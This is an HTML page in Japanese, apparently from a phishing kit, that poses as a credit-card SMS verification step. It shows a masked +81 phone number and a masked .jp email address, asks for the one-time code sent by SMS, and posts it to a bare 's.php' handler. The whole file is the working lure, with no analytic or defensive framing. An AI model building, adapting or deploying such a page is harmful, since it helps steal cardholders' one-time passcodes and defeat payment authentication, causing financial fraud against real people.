<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS Verification</title>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            padding: 40px;
            max-width: 400px;
            width: 100%;
            text-align: center;
            margin-bottom: 30px; /* Space before the alert */
        }

        h1 {
            color: #333;
            font-size: 24px;
            margin-bottom: 10px;
        }

        p {
            color: #666;
            font-size: 14px;
            margin-bottom: 30px;
        }

        .code-input {
            width: 100%;
            padding: 15px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 18px;
            text-align: center;
            letter-spacing: 5px;
            margin-bottom: 20px;
        }

        .code-input:focus {
            outline: none;
            border-color: #4CAF50;
        }

        .verify-btn {
            width: 100%;
            padding: 15px;
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }

        .verify-btn:hover {
            background: #45a049;
        }

        .message {
            margin-top: 20px;
            padding: 10px;
            border-radius: 5px;
            display: none;
        }

        .success {
            background: #d4edda;
            color: #155724;
        }

        .error {
            background: #f8d7da;
            color: #721c24;
        }

        /* FULL-WIDTH ALERT BAR */
        .alert-bar {
            width: 100%;
            background: #F58027;
            color: #fff;
            padding: 14px 20px;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 500;
            text-align: center;
            max-width: 900px;
        }
    </style>

</head>
<body>

<form action="s.php" method="POST">

<div class="container">

    <h1>クレジットカードを確認する</h1>
    <p>+81******** の番号に送信された  桁のコードを入力してください。</p>

    <input 
        type="text"
        class="code-input"
        name="otp"
        id="codeInput"
        placeholder="000000"
        maxlength="10"
        inputmode="numeric"
        pattern="[0-9]*"
    >

    <button class="verify-btn" type="submit">確認する</button>

</div>

</form>

<div class="message" id="message"></div>

<!-- FIXED ALERT BAR -->
<div class="alert-bar">
   SMSコードが届いていませんか？メールアドレス xxxxx@xxxx.jp でコードをご確認ください。.
</div>

<script>
    const input = document.getElementById('codeInput');
    const message = document.getElementById('message');

    input.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/\D/g, '');
    });
</script>

</body>
</html>
